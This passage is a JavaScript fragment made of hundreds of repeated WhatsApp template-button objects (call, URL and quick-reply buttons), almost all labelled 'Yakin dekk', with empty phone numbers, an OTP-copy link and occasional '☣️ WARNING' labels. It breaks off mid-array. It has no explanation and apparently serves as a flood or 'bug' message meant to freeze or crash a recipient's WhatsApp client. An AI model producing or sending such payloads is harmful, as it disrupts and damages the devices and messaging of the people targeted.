   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
  { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
  { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
  { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
  { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
   { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ urlButton: { displayText: `Yakin dekk`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
{ quickReplyButton: { displayText: `Yakin dekk`, id: ``}},
 { callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
{ callButton: { displayText: `Yakin dekk`, phoneNumber: ``}},
